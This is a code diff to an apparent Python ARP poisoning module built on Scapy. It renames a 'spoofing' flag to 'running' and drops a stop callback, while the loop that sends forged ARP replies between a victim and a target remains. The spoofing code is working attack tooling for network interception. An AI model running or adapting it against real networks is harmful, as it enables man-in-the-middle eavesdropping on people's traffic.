@@ -19,8 +19,6 @@ class arp(Poison):
 		self.local  = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
 		self.victim = ()
 		self.target = ()
-		# flag for spoofing 
-		self.spoofing = False
 		super(arp,self).__init__('ARP Spoof')
 
 	def initialize(self):
@@ -58,18 +56,18 @@ class arp(Poison):
 			# send ARP replies to spoofed address
 			target_thread = Thread(target=self.respoofer, args=(self.victim, self.target))
 			target_thread.start()
-			self.spoofing = True
+			self.running = True
 		except KeyboardInterrupt:
 			Msg('Closing ARP poison down...')
-			self.spoofing = False
+			self.running = False
 			return None
 		except TypeError, t:
 			Error('Type error: %s'%t)
-			self.spoofing = False
+			self.running = False
 			return None
 		except Exception, j:
 			Error('Error with ARP poisoner: %s'%j)
-			self.spoofing = False
+			self.running = False
 			return None
 		return self.victim[0]
 			
@@ -78,29 +76,21 @@ class arp(Poison):
 		"""
 		try:
 			pkt = Ether(dst=target[1],src=self.local[1])/ARP(op="who-has",psrc=victim[0], pdst=target[0])
-			while self.spoofing:
+			while self.running:
 				sendp(pkt, iface_hint=target[0])
 				time.sleep(2)
 		except Exception, j:
 			Error('Spoofer error: %s'%j)
 			return None
 	
-	def test_stop(self):
-		""" Callback for stopping the sniffer
-		"""
-		if self.spoofing:
-			return False
-		debug("Stopping spoof threads..")
-		return True
-	
 	def shutdown(self):
 		""" Shutdown the ARP spoofer
 		"""
-		if not self.spoofing: 
+		if not self.running: 
 			return
 		Msg("Initiating ARP shutdown...")
 		debug('initiating ARP shutdown')
-		self.spoofing = False
+		self.running = False
 		time.sleep(2) # give it a sec for the respoofer
 		# rectify the ARP caches
 		sendp(Ether(dst=self.victim[1],src=self.target[1])/ARP(op='who-has', 
